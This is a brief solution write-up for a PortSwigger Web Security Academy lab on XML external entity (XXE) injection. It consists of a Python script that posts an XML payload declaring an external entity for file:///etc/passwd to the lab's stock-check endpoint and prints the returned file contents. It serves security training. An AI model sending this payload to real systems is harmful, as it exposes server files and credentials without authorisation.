# Lab: Exploiting XXE using external entities to retrieve files

Link to lab: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files

## Solution
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'Host': '0a6300c2046a6e3cc0df1cea00ce0085.web-security-academy.net',
    'Content-Type': 'application/xml',
}

data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;#1</productId><storeId>1</storeId>\r\n</stockCheck>'

response = requests.post(
    'https://0a6300c2046a6e3cc0df1cea00ce0085.web-security-academy.net/product/stock',
    headers=headers,
    data=data,
    verify=False,
)

print(response.text)
```